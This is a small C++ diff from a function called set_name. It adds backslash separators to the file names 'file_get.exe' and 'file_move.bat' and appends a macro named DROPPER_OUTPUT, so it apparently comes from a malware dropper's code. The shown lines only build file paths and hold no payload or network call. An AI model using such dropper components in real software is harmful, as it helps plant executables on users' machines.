@@ -343,8 +343,8 @@ void set_name(std::uint64_t os_version)
 		}
 	#else
 
-		name2+="file_get.exe";
-		name3+="file_move.bat";
+		name2+="\\file_get.exe";
+		name3+="\\file_move.bat";
 
 	#endif
 #else
@@ -370,7 +370,7 @@ void set_name(std::uint64_t os_version)
 #else
 
 	name1+=DROPPER_OUTPUT;
-	name3+="file_move.bat";
+	name3+="\\file_move.bat";
 #endif
 	}
 
